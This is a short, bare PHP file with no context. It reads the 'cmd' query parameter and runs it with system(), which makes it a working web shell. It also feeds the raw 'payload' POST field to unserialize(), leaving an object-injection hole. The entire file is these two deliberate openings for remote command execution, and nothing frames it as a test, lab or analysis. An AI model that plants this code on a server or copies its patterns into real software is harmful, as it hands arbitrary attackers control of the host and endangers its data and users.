<?php
$cmd = $_GET['cmd'];
system($cmd);
$payload = $_POST['payload'];
unserialize($payload);
